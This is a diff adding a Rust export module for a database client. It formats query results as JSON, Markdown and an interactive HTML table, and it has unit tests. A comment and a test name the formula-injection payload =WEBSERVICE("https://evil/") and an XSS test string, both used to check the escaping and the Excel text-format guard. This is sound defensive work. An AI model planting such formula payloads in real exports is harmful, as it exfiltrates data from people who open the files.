@@ -1,0 +1,760 @@
+use serde::{Deserialize, Serialize};
+use serde_json::{Map, Value};
+
+use crate::csv_export::needs_formula_guard;
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct QueryResultTextExportData {
+    #[serde(default)]
+    pub title: Option<String>,
+    pub columns: Vec<String>,
+    pub rows: Vec<Vec<Value>>,
+}
+
+pub fn normalize_nebula_export_rows(rows: &mut [Vec<Value>]) {
+    for value in rows.iter_mut().flatten() {
+        let graph_cell = value.get("__dbx_graph_cell").and_then(Value::as_str) == Some("nebula-v1")
+            && value.get("kind").is_some_and(Value::is_string)
+            && value.get("nodes").is_some_and(Value::is_array)
+            && value.get("edges").is_some_and(Value::is_array);
+        if graph_cell {
+            if let Some(display) = value.get("display").and_then(Value::as_str) {
+                *value = Value::String(display.to_owned());
+            }
+        }
+    }
+}
+
+pub fn normalize_neo4j_export_rows(rows: &mut [Vec<Value>]) {
+    for value in rows.iter_mut().flatten() {
+        let graph_cell = value.get("__dbx_graph_cell").and_then(Value::as_str) == Some("neo4j-v1")
+            && value.get("kind").is_some_and(Value::is_string)
+            && value.get("nodes").is_some_and(Value::is_array)
+            && value.get("edges").is_some_and(Value::is_array);
+        let node_cell = value.get("__dbx_neo4j_node").and_then(Value::as_str) == Some("v1")
+            && value.get("properties").is_some_and(Value::is_array);
+        if graph_cell || node_cell {
+            if let Some(display) = value.get("display").and_then(Value::as_str) {
+                *value = Value::String(display.to_owned());
+            }
+        }
+    }
+}
+
+pub fn format_json(data: &QueryResultTextExportData) -> Result<String, String> {
+    let rows = data
+        .rows
+        .iter()
+        .map(|row| {
+            let mut object = Map::new();
+            for (index, column) in data.columns.iter().enumerate() {
+                if let Some(value) = row.get(index) {
+                    object.insert(column.clone(), value.clone());
+                }
+            }
+            Value::Object(object)
+        })
+        .collect::<Vec<_>>();
+    serde_json::to_string_pretty(&rows).map_err(|err| err.to_string())
+}
+
+pub fn format_markdown(data: &QueryResultTextExportData) -> String {
+    let normalized_columns = data.columns.iter().map(|column| markdown_cell(column)).collect::<Vec<_>>();
+    let normalized_rows = data
+        .rows
+        .iter()
+        .map(|row| row.iter().map(|cell| markdown_cell(&display_cell(cell))).collect::<Vec<_>>())
+        .collect::<Vec<_>>();
+    let widths = normalized_columns
+        .iter()
+        .enumerate()
+        .map(|(index, column)| {
+            let row_width = normalized_rows
+                .iter()
+                .map(|row| row.get(index).map(|cell| cell.chars().count()).unwrap_or(0))
+                .max()
+                .unwrap_or(0);
+            column.chars().count().max(row_width).max(3)
+        })
+        .collect::<Vec<_>>();
+
+    let header = format!(
+        "| {} |",
+        normalized_columns
+            .iter()
+            .enumerate()
+            .map(|(index, column)| pad(column, widths[index]))
+            .collect::<Vec<_>>()
+            .join(" | ")
+    );
+    let separator = format!("| {} |", widths.iter().map(|width| "-".repeat(*width)).collect::<Vec<_>>().join(" | "));
+    let body = normalized_rows
+        .iter()
+        .map(|row| {
+            format!(
+                "| {} |",
+                row.iter()
+                    .enumerate()
+                    .map(|(index, cell)| pad(cell, widths.get(index).copied().unwrap_or(3)))
+                    .collect::<Vec<_>>()
+                    .join(" | ")
+            )
+        })
+        .collect::<Vec<_>>()
+        .join("\n");
+    [header, separator, body].into_iter().filter(|part| !part.is_empty()).collect::<Vec<_>>().join("\n") + "\n"
+}
+
+fn display_cell(value: &Value) -> String {
+    match value {
+        Value::Null => "NULL".to_string(),
+        Value::Bool(value) => value.to_string(),
+        Value::Number(value) => value.to_string(),
+        Value::String(value) => value.clone(),
+        other => other.to_string(),
+    }
+}
+
+fn markdown_cell(value: &str) -> String {
+    value.replace('|', "\\|").replace("\r\n", "<br>").replace('\n', "<br>")
+}
+
+fn pad(value: &str, width: usize) -> String {
+    let current = value.chars().count();
+    if current >= width {
+        return value.to_string();
+    }
+    format!("{value}{}", " ".repeat(width - current))
+}
+
+pub fn format_html(data: &QueryResultTextExportData) -> String {
+    let now = chrono_local_now();
+    let heading = data.title.as_deref().unwrap_or("Query Result");
+    let row_count = data.rows.len();
+    let col_count = data.columns.len();
+
+    let mut html = String::with_capacity(4096 + col_count * 64 + row_count * col_count * 48);
+
+    html.push_str("<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n");
+    html.push_str("  <meta charset=\"UTF-8\">\n");
+    html.push_str("  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n");
+    html.push_str(&format!("  <title>{}</title>\n", html_escape(heading)));
+    html.push_str(
+        r#"  <style>
+    :root {
+      --surface: #ffffff; --bg: #f6f8fa;
+      --text: #1f2328; --text-2: #59636e; --muted: #818b98;
+      --border: #d1d9e0; --border-2: #e7ecf0;
+      --hover: #eef2f6; --stripe: #f9fbfc;
+      --th-bg: #f0f3f6;
+      --ok: #1a7f37; --danger: #cf222e;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --surface: #1c2128; --bg: #0d1117;
+        --text: #e6edf3; --text-2: #9198a1; --muted: #6e7681;
+        --border: #3d444d; --border-2: #2a3038;
+        --hover: #202830; --stripe: #161b22;
+        --th-bg: #22272e;
+        --ok: #3fb950; --danger: #f85149;
+      }
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                   "Helvetica Neue", Arial, "Noto Sans SC", "PingFang SC",
+                   "Microsoft YaHei", sans-serif;
+      background: var(--bg); color: var(--text);
+      padding: 16px; line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      height: 100vh; overflow: hidden;
+      display: flex; flex-direction: column;
+    }
+    .page {
+      flex: 1; min-height: 0; width: 100%;
+      display: flex; flex-direction: column;
+    }
+    .hdr { flex-shrink: 0; margin-bottom: 12px; }
+    .hdr h1 { font-size: 16px; font-weight: 600; }
+    .hdr .meta { font-size: 12px; color: var(--muted); margin-top: 2px; }
+    .tools {
+      display: flex; flex-wrap: wrap; align-items: center; gap: 8px;
+      margin-bottom: 10px;
+    }
+    .tools label { display: inline-flex; align-items: center; gap: 6px; font-size: 12px; color: var(--text-2); }
+    .tools input, .tools select, .tools button {
+      height: 30px; border: 1px solid var(--border); border-radius: 6px;
+      background: var(--surface); color: var(--text); font: inherit; font-size: 12px;
+    }
+    .tools input { width: min(280px, 42vw); padding: 0 9px; }
+    .tools select { max-width: 180px; padding: 0 26px 0 8px; }
+    .tools button { padding: 0 10px; cursor: pointer; }
+    .tools button:hover { background: var(--hover); }
+    .tools .count { margin-left: auto; color: var(--muted); font-size: 12px; }
+    .tbl-wrap {
+      flex: 1; min-height: 0;
+      display: flex; flex-direction: column;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+    }
+    .tbl-scroll {
+      flex: 1; min-height: 0;
+      overflow: auto;
+      scrollbar-width: thin;
+      scrollbar-color: var(--muted) transparent;
+    }
+    .tbl-scroll::-webkit-scrollbar { height: 10px; width: 10px; }
+    .tbl-scroll::-webkit-scrollbar-thumb { background: var(--muted); border-radius: 8px; }
+    .tbl-scroll::-webkit-scrollbar-thumb:hover { background: var(--text-2); }
+    .tbl-scroll::-webkit-scrollbar-track { background: transparent; }
+    table { border-collapse: separate; border-spacing: 0; width: 100%; font-size: 13px; }
+    thead th {
+      position: sticky; top: 0; z-index: 1;
+      padding: 8px 12px;
+      background: var(--th-bg); color: var(--text);
+      font-weight: 600; font-size: 12px; text-align: left;
+      border-bottom: 1px solid var(--border);
+      white-space: nowrap;
+    }
+    thead th .sort-button {
+      display: inline-flex; align-items: center; gap: 5px; width: 100%;
+      padding: 0; border: 0; background: transparent; color: inherit;
+      font: inherit; text-align: left; cursor: pointer;
+    }
+    thead th .sort-button:hover { color: var(--text-2); }
+    .sort-indicator { color: var(--muted); font-size: 12px; line-height: 1; opacity: .8; }
+    tbody td {
+      padding: 6px 12px;
+      border-bottom: 1px solid var(--border-2);
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 380px;
+      color: var(--text); vertical-align: middle;
+    }
+    tbody tr:last-child td { border-bottom: none; }
+    tbody tr:nth-child(even) td { background: var(--stripe); }
+    tbody tr:hover td { background: var(--hover); }
+    td.null { color: var(--muted); font-style: italic; }
+    td.number { text-align: right; font-variant-numeric: tabular-nums; font-family: ui-monospace, Consolas, "Liberation Mono", monospace; }
+    td.boolean { text-align: center; }
+    td.boolean.true  { color: var(--ok); }
+    td.boolean.false { color: var(--danger); }
+    .ftr { flex-shrink: 0; margin-top: 12px; font-size: 11px; color: var(--muted); text-align: center; }
+    @media print {
+      html, body { height: auto; overflow: visible; }
+      body { display: block; background: #fff; padding: 0; }
+      .page, .tbl-wrap { display: block; }
+      .tbl-scroll { max-height: none; overflow: visible; }
+      thead th { position: static; }
+      .tools { display: none; }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+"#
+    );
+
+    // Header
+    html.push_str("    <div class=\"hdr\">\n");
+    html.push_str(&format!("      <h1>{}</h1>\n", html_escape(heading)));
+    html.push_str(&format!(
+        "      <div class=\"meta\">{} rows &middot; {} columns &middot; {} &middot; DBX</div>\n",
+        row_count,
+        col_count,
+        html_escape(&now)
+    ));
+    html.push_str("    </div>\n");
+
+    html.push_str("    <div class=\"tools\" role=\"search\" aria-label=\"Filter query result\">\n");
+    html.push_str("      <label>Search <input id=\"dbx-search\" type=\"search\" placeholder=\"Search all columns\" autocomplete=\"off\"></label>\n");
+    html.push_str("      <label>Filter <select id=\"dbx-filter-column\"><option value=\"\">All columns</option>");
+    for (index, column) in data.columns.iter().enumerate() {
+        html.push_str(&format!("<option value=\"{}\">{}</option>", index, html_escape(column)));
+    }
+    html.push_str("</select></label>\n");
+    html.push_str("      <input id=\"dbx-filter-value\" type=\"search\" placeholder=\"Filter value\" autocomplete=\"off\" aria-label=\"Filter value\">\n");
+    html.push_str("      <button id=\"dbx-clear-filters\" type=\"button\">Clear</button>\n");
+    html.push_str("      <span id=\"dbx-match-count\" class=\"count\" aria-live=\"polite\"></span>\n");
+    html.push_str("    </div>\n");
+
+    // Table card
+    html.push_str("    <div class=\"tbl-wrap\">\n");
+    html.push_str("      <div class=\"tbl-scroll\">\n");
+    html.push_str("        <table>\n          <thead>\n            <tr>\n");
+    for (index, col) in data.columns.iter().enumerate() {
+        html.push_str(&format!(
+            "              <th{}><button class=\"sort-button\" type=\"button\" data-sort-column=\"{}\" aria-sort=\"none\">{}<span class=\"sort-indicator\" aria-hidden=\"true\">↕</span></button></th>\n",
+            html_formula_guard_attribute(col),
+            index,
+            html_escape(col)
+        ));
+    }
+    html.push_str("            </tr>\n          </thead>\n          <tbody>\n");
+
+    for row in &data.rows {
+        html.push_str("            <tr>\n");
+        for cell in row {
+            let (text, css_class) = html_cell_value(cell);
+            let guard = html_formula_guard_attribute(&text);
+            if css_class.is_empty() {
+                html.push_str(&format!("              <td{guard}>{}</td>\n", html_escape(&text)));
+            } else {
+                html.push_str(&format!("              <td class=\"{css_class}\"{guard}>{}</td>\n", html_escape(&text)));
+            }
+        }
+        html.push_str("            </tr>\n");
+    }
+
+    html.push_str("          </tbody>\n        </table>\n      </div>\n    </div>\n");
+    html.push_str(
+        r#"    <script>
+      (() => {
+        const search = document.getElementById('dbx-search');
+        const column = document.getElementById('dbx-filter-column');
+        const value = document.getElementById('dbx-filter-value');
+        const clear = document.getElementById('dbx-clear-filters');
+        const count = document.getElementById('dbx-match-count');
+        const tbody = document.querySelector('tbody');
+        const rows = Array.from(tbody.querySelectorAll('tr'));
+        const originalOrder = rows.slice();
+        const sortButtons = Array.from(document.querySelectorAll('[data-sort-column]'));
+        let sortedColumn = -1;
+        let sortDirection = 0;
+        const normalize = (text) => text.toLocaleLowerCase();
+        const compareCells = (left, right) => {
+          const leftText = (left.textContent || '').trim();
+          const rightText = (right.textContent || '').trim();
+          const leftNull = left.classList.contains('null');
+          const rightNull = right.classList.contains('null');
+          if (leftNull || rightNull) return leftNull === rightNull ? 0 : (leftNull ? 1 : -1);
+          const leftNumber = Number(leftText);
+          const rightNumber = Number(rightText);
+          if (leftText !== '' && rightText !== '' && Number.isFinite(leftNumber) && Number.isFinite(rightNumber)) {
+            return leftNumber - rightNumber;
+          }
+          return leftText.localeCompare(rightText, undefined, { numeric: true, sensitivity: 'base' });
+        };
+        const updateSortIndicators = () => {
+          sortButtons.forEach((button) => {
+            const active = Number(button.dataset.sortColumn) === sortedColumn;
+            const direction = active ? (sortDirection === 1 ? '↑' : '↓') : '↕';
+            button.setAttribute('aria-sort', active ? (sortDirection === 1 ? 'ascending' : sortDirection === -1 ? 'descending' : 'none') : 'none');
+            const indicator = button.querySelector('.sort-indicator');
+            if (indicator) indicator.textContent = direction;
+          });
+        };
+        const sortRows = (index) => {
+          if (sortedColumn !== index) {
+            sortedColumn = index;
+            sortDirection = 1;
+          } else if (sortDirection === 1) {
+            sortDirection = -1;
+          } else if (sortDirection === -1) {
+            sortedColumn = -1;
+            sortDirection = 0;
+          }
+          if (sortDirection === 0) {
+            originalOrder.forEach((row) => tbody.appendChild(row));
+          } else {
+            rows.slice().sort((left, right) => {
+              const result = compareCells(left.children[index], right.children[index]);
+              return result * sortDirection;
+            }).forEach((row) => tbody.appendChild(row));
+          }
+          updateSortIndicators();
+        };
+        const apply = () => {
+          const query = normalize(search.value.trim());
+          const filter = normalize(value.value.trim());
+          const columnIndex = column.value === '' ? -1 : Number(column.value);
+          let visible = 0;
+          rows.forEach((row) => {
+            const cells = Array.from(row.children);
+            const rowText = normalize(row.textContent || '');
+            const filterText = columnIndex < 0 ? rowText : normalize(cells[columnIndex]?.textContent || '');
+            const matches = (!query || rowText.includes(query)) && (!filter || filterText.includes(filter));
+            row.hidden = !matches;
+            if (matches) visible += 1;
+          });
+          count.textContent = `${visible} / ${rows.length} rows`;
+        };
+        search.addEventListener('input', apply);
+        value.addEventListener('input', apply);
+        column.addEventListener('change', apply);
+        sortButtons.forEach((button) => button.addEventListener('click', () => sortRows(Number(button.dataset.sortColumn))));
+        clear.addEventListener('click', () => {
+          search.value = '';
+          value.value = '';
+          column.value = '';
+          apply();
+          search.focus();
+        });
+        apply();
+      })();
+    </script>
+"#,
+    );
+    html.push_str("    <div class=\"ftr\">Exported by DBX</div>\n");
+    html.push_str("  </div>\n</body>\n</html>\n");
+    html
+}
+
+/// Attribute that keeps Excel from evaluating an exported cell as a formula.
+///
+/// Excel reads an exported HTML table as sheet cells and evaluates a cell whose
+/// text looks like a formula, so a stored `=WEBSERVICE("https://evil/")` runs when
+/// the file is opened in a spreadsheet -- the same exfiltration channel #10542
+/// closed for CSV/TSV. This is measured on Excel 16.0: an unannotated `=1+1` cell
+/// arrives as the number 2, ` =cmd` executes after the leading space is dropped, and
+/// `-1+2` is promoted to `=-1+2`.
+///
+/// Excel's own text number format makes the cell plain text instead. Browsers ignore
+/// the `mso-` property, so the exported page still renders the value byte-for-byte --
+/// which matters because the HTML export's primary consumer is a browser, and the
+/// leading apostrophe the CSV/TSV writers use would be visible there.
+fn html_formula_guard_attribute(value: &str) -> &'static str {
+    if needs_formula_guard(value) {
+        r##" style="mso-number-format:'\@'""##
+    } else {
+        ""
+    }
+}
+
+fn html_escape(value: &str) -> String {
+    let mut out = String::with_capacity(value.len());
+    for ch in value.chars() {
+        match ch {
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '&' => out.push_str("&amp;"),
+            '"' => out.push_str("&quot;"),
+            '\'' => out.push_str("&#39;"),
+            '\n' => out.push_str("<br>"),
+            '\r' => {}
+            _ => out.push(ch),
+        }
+    }
+    out
+}
+
+fn html_cell_value(value: &Value) -> (String, &'static str) {
+    match value {
+        Value::Null => ("NULL".to_string(), "null"),
+        Value::Bool(true) => ("true".to_string(), "boolean true"),
+        Value::Bool(false) => ("false".to_string(), "boolean false"),
+        Value::Number(n) => (n.to_string(), "number"),
+        Value::String(s) => (s.clone(), ""),
+        other => (other.to_string(), ""),
+    }
+}
+
+fn chrono_local_now() -> String {
+    chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string()
+}
+
+#[cfg(test)]
+mod tests {
+    use serde_json::{json, Value};
+
+    use super::{
+        format_html, format_json, format_markdown, normalize_nebula_export_rows, normalize_neo4j_export_rows,
+        QueryResultTextExportData,
+    };
+
+    #[test]
+    fn nebula_exports_use_display_cells_without_leaking_graph_metadata() {
+        let mut rows = vec![
+            vec![
+                json!({
+                    "__dbx_graph_cell": "nebula-v1", "kind": "vertex", "display": "(:\"player\" {\"name\":\"Tim\"})",
+                    "nodes": [{"id": "vid:1", "labels": ["player"], "properties": [{"name": "name", "value": "Tim"}]}], "edges": []
+                }),
+                json!(false),
+                Value::Null,
+            ],
+            vec![
+                json!({"__dbx_graph_cell": "nebula-v1", "kind": "edge", "display": "[:follow]", "nodes": [], "edges": [{"type": "follow"}]}),
+                json!(7),
+                json!("plain"),
+            ],
+        ];
+        normalize_nebula_export_rows(&mut rows);
+        assert_eq!(rows[0], vec![json!("(:\"player\" {\"name\":\"Tim\"})"), json!(false), Value::Null]);
+        assert_eq!(rows[1], vec![json!("[:follow]"), json!(7), json!("plain")]);
+        let data = QueryResultTextExportData {
+            title: None,
+            columns: vec!["entity".into(), "value".into(), "note".into()],
+            rows,
+        };
+        let exported: Value = serde_json::from_str(&format_json(&data).unwrap()).unwrap();
+        assert_eq!(exported[0]["entity"], json!("(:\"player\" {\"name\":\"Tim\"})"));
+        assert!(!format_markdown(&data).contains("__dbx_graph_cell"));
+    }
+
+    #[test]
+    fn nebula_export_normalization_preserves_ordinary_and_unknown_objects() {
+        let mut rows = vec![vec![
+            json!({"display": "ordinary", "properties": []}),
+            json!({"__dbx_graph_cell": "neo4j-v1", "kind": "vertex", "display": "neo4j", "nodes": [], "edges": []}),
+            json!({"__dbx_graph_cell": "nebula-v2", "kind": "vertex", "display": "future", "nodes": [], "edges": []}),
+            json!({"__dbx_graph_cell": "nebula-v1", "kind": "vertex", "display": 42, "nodes": [], "edges": []}),
+            json!({"__dbx_graph_cell": "nebula-v1", "kind": "vertex", "display": "malformed", "nodes": null, "edges": []}),
+        ]];
+        let original = rows.clone();
+        normalize_nebula_export_rows(&mut rows);
+        assert_eq!(rows[0][0], json!({"display": "ordinary", "properties": []}));
+        assert_eq!(rows[0][1], original[0][1]);
+        assert_eq!(rows[0][2], original[0][2]);
+        assert_eq!(rows[0][3], original[0][3]);
+        assert_eq!(rows[0][4], original[0][4]);
+    }
+
+    #[test]
+    fn neo4j_exports_use_display_cells_without_leaking_graph_metadata() {
+        let displays = [
+            ("vertex", "(:Person {\"count\":9007199254740993})"),
+            ("edge", "[:KNOWS]"),
+            ("path", "{\"nodes\":[],\"relationships\":[]}"),
+            ("map", "{\"count\":9007199254740993,\"node\":{\"labels\":[\"Person\"]}}"),
+        ];
+        let mut rows = displays
+            .iter()
+            .map(|(kind, display)| {
+                vec![
+                    json!({
+                        "__dbx_graph_cell": "neo4j-v1", "kind": kind, "display": display,
+                        "nodes": [], "edges": [], "displayParts": ["internal metadata"]
+                    }),
+                    json!(false),
+                    Value::Null,
+                ]
+            })
+            .collect::<Vec<_>>();
+        rows.push(vec![
+            json!({"__dbx_neo4j_node":"v1", "display":"(:Legacy)", "properties": []}),
+            json!(7),
+            json!("plain"),
+        ]);
+        normalize_neo4j_export_rows(&mut rows);
+        for (index, (_, display)) in displays.iter().enumerate() {
+            assert_eq!(rows[index], vec![json!(display), json!(false), Value::Null]);
+        }
+        assert_eq!(rows[4], vec![json!("(:Legacy)"), json!(7), json!("plain")]);
+        let data = QueryResultTextExportData {
+            title: None,
+            columns: vec!["entity".into(), "value".into(), "note".into()],
+            rows,
+        };
+        let exported: Value = serde_json::from_str(&format_json(&data).unwrap()).unwrap();
+        assert_eq!(exported[0]["entity"], json!(displays[0].1));
+        assert_eq!(exported[1]["entity"], json!("[:KNOWS]"));
+        assert!(!format_markdown(&data).contains("__dbx_graph_cell"));
+    }
+
+    #[test]
+    fn neo4j_export_normalization_preserves_ordinary_and_unknown_objects() {
+        let mut rows = vec![vec![
+            json!({"display":"ordinary", "properties":[]}),
+            json!({"__dbx_graph_cell":"nebula-v1", "kind":"vertex", "display":"nebula", "nodes":[], "edges":[]}),
+            json!({"__dbx_graph_cell":"neo4j-v2", "kind":"vertex", "display":"future", "nodes":[], "edges":[]}),
+            json!({"__dbx_graph_cell":"neo4j-v1", "kind":"vertex", "display":42, "nodes":[], "edges":[]}),
+            json!({"__dbx_graph_cell":"neo4j-v1", "kind":"vertex", "display":"malformed", "nodes":null, "edges":[]}),
+        ]];
+        let original = rows.clone();
+        normalize_neo4j_export_rows(&mut rows);
+        assert_eq!(rows, original);
+    }
+
+    #[test]
+    fn formats_json_rows_as_objects() {
+        let out = format_json(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["id".to_string(), "name".to_string(), "active".to_string(), "note".to_string()],
+            rows: vec![vec![json!(1), json!("Ada"), json!(true), Value::Null]],
+        })
+        .unwrap();
+
+        assert_eq!(
+            out,
+            r#"[
+  {
+    "id": 1,
+    "name": "Ada",
+    "active": true,
+    "note": null
+  }
+]"#
+        );
+    }
+
+    #[test]
+    fn formats_markdown_with_escaped_pipes_and_newlines() {
+        let out = format_markdown(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["id".to_string(), "payload|kind".to_string()],
+            rows: vec![vec![json!(1), json!("a|b")], vec![json!(2), json!("line one\nline two")]],
+        });
+
+        assert_eq!(
+            out,
+            [
+                "| id  | payload\\|kind        |",
+                "| --- | -------------------- |",
+                "| 1   | a\\|b                 |",
+                "| 2   | line one<br>line two |",
+                "",
+            ]
+            .join("\n")
+        );
+    }
+
+    #[test]
+    fn formats_html_document_structure() {
+        let out = format_html(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["id".to_string(), "name".to_string()],
+            rows: vec![vec![json!(1), json!("Ada")]],
+        });
+
+        assert!(out.starts_with("<!DOCTYPE html>"), "must start with doctype");
+        assert!(out.ends_with("</html>\n"), "must end with closing html tag");
+        assert!(out.contains("<meta charset=\"UTF-8\">"));
+        assert!(out.contains("<style>"), "CSS must be embedded");
+        assert!(out.contains("<h1>Query Result</h1>"), "default heading when no title");
+        assert!(out.contains("data-sort-column=\"0\""), "sortable column headers must be rendered");
+        assert!(out.contains(">id<span class=\"sort-indicator\""), "column header text must be rendered");
+        assert!(out.contains(">name<span class=\"sort-indicator\""));
+        assert!(out.contains("id=\"dbx-search\""), "global search control must be rendered");
+        assert!(out.contains("id=\"dbx-filter-column\""), "column filter control must be rendered");
+        assert!(out.contains("id=\"dbx-clear-filters\""), "filter reset control must be rendered");
+        assert!(out.contains("row.hidden = !matches"), "filter behavior must be embedded");
+        assert!(out.contains("sortRows"), "sort behavior must be embedded");
+        assert!(out.contains("1 rows &middot; 2 columns"), "row/column counts in meta line");
+        assert!(out.contains("Exported by DBX"), "footer watermark");
+    }
+
+    #[test]
+    fn formats_html_uses_custom_title() {
+        let out = format_html(&QueryResultTextExportData {
+            title: Some("public.users".to_string()),
+            columns: vec!["id".to_string()],
+            rows: vec![vec![json!(1)]],
+        });
+
+        assert!(out.contains("<title>public.users</title>"), "document title must use table name");
+        assert!(out.contains("<h1>public.users</h1>"), "heading must use table name");
+        assert!(!out.contains("<h1>Query Result</h1>"), "default heading must not appear");
+    }
+
+    #[test]
+    fn formats_html_escapes_title() {
+        let out = format_html(&QueryResultTextExportData {
+            title: Some("<b>users & more</b>".to_string()),
+            columns: vec!["id".to_string()],
+            rows: vec![],
+        });
+
+        assert!(out.contains("&lt;b&gt;users &amp; more&lt;/b&gt;"), "title must be escaped");
+        assert!(!out.contains("<b>users"), "raw markup must never appear in heading");
+    }
+
+    #[test]
+    fn formats_html_with_typed_cell_classes() {
+        let out = format_html(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["n".to_string(), "flag".to_string(), "off".to_string(), "note".to_string()],
+            rows: vec![vec![json!(42), json!(true), json!(false), Value::Null]],
+        });
+
+        assert!(out.contains("<td class=\"number\">42</td>"));
+        assert!(out.contains("<td class=\"boolean true\">true</td>"));
+        assert!(out.contains("<td class=\"boolean false\">false</td>"));
+        assert!(out.contains("<td class=\"null\">NULL</td>"));
+    }
+
+    #[test]
+    fn formats_html_escapes_special_characters() {
+        let out = format_html(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["col<a>".to_string()],
+            rows: vec![vec![json!("<script>alert('x');</script> & \"quoted\"")]],
+        });
+
+        assert!(out.contains(">col&lt;a&gt;<span class=\"sort-indicator\""), "header must be escaped");
+        assert!(!out.contains("<script>alert"), "raw script tag must never appear");
+        assert!(out.contains("&lt;script&gt;"));
+        assert!(out.contains("&amp; &quot;quoted&quot;"));
+        assert!(out.contains("&#39;x&#39;"), "single quotes must be escaped");
+    }
+
+    #[test]
+    fn formats_html_keeps_excel_from_evaluating_formula_shaped_cells() {
+        // Excel reads an exported HTML table as sheet cells. Without the text number
+        // format a stored `=WEBSERVICE(...)` runs on open, ` =cmd` runs after the
+        // leading space is dropped, and `-1+2` is promoted to a formula; `+2` is
+        // silently coerced to the number 2, losing the sign. The attribute has to be
+        // on the cell itself and correctly terminated, and the value must stay
+        // untouched so a browser renders exactly what the database holds.
+        const TEXT_FORMAT: &str = " style=\"mso-number-format:'\\@'\"";
+        let guarded = |value: &str| format!("<td{TEXT_FORMAT}>{value}</td>");
+
+        let out = format_html(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["=evil".to_string(), "plain".to_string()],
+            rows: vec![vec![
+                json!("=WEBSERVICE(\"https://evil/\")"),
+                json!("plain"),
+                json!("+2"),
+                json!("-1+2"),
+                json!(" =cmd"),
+                json!("-note"),
+                json!("@x"),
+                json!(42),
+                Value::Null,
+            ]],
+        });
+
+        // The same predicate the CSV/TSV writers use decides which cells are guarded.
+        for value in ["=WEBSERVICE(&quot;https://evil/&quot;)", "+2", "-1+2", " =cmd", "-note", "@x"] {
+            assert!(out.contains(&guarded(value)), "cell {value:?} must carry the text number format");
+        }
+        // Column names reach the sheet too, so a formula-shaped header is covered.
+        assert!(
+            out.contains(&format!("<th{TEXT_FORMAT}><button class=\"sort-button\"")),
+            "a formula-shaped header must carry the text number format"
+        );
+
+        // Cells Excel treats as text anyway keep the plain form, and the guard never
+        // rewrites the value (no apostrophe, unlike the CSV/TSV writers).
+        assert!(out.contains("<td>plain</td>"));
+        assert!(out.contains("<td class=\"number\">42</td>"));
+        assert!(out.contains("<td class=\"null\">NULL</td>"));
+        assert!(!out.contains("'="), "the value itself must not be prefixed");
+    }
+
+    #[test]
+    fn formats_html_empty_result_set() {
+        let out =
+            format_html(&QueryResultTextExportData { title: None, columns: vec!["id".to_string()], rows: vec![] });
+
+        assert!(out.contains("0 rows &middot; 1 columns"));
+        assert!(out.contains("<tbody>\n          </tbody>"), "empty tbody");
+    }
+
+    #[test]
+    fn local_now_matches_expected_format() {
+        let stamp = super::chrono_local_now();
+        // e.g. 2026-09-17 14:30:59
+        let parts: Vec<&str> = stamp.split(['-', ' ', ':']).collect();
+        assert_eq!(parts.len(), 6, "timestamp must have 6 parts: {stamp}");
+        assert_eq!(stamp.len(), 19, "timestamp must be 19 chars: {stamp}");
+        let year: i32 = parts[0].parse().unwrap();
+        let month: u32 = parts[1].parse().unwrap();
+        let day: u32 = parts[2].parse().unwrap();
+        assert!((2020..=2100).contains(&year), "year out of range: {year}");
+        assert!((1..=12).contains(&month), "month out of range: {month}");
+        assert!((1..=31).contains(&day), "day out of range: {day}");
+    }
+}
